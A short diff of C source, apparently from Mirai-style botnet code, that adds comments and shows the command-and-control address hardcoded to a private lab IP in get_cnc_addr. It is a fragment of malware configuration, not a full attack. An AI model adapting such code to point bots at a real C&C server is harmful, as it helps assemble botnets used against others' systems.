@@ -256,6 +256,7 @@ static void teardown_connection(void)
     sleep(1);
 }
 
+// not call it yet
 static void resolve_cnc_addr(void)
 {
     struct resolv_entries *entries;
@@ -282,6 +283,7 @@ static void resolve_cnc_addr(void)
 #endif
 }
 
+// set the ipv4 ip here
 static void get_cnc_addr(void)
 {
     srv_addr.sin_addr.s_addr = inet_addr("192.168.59.129");
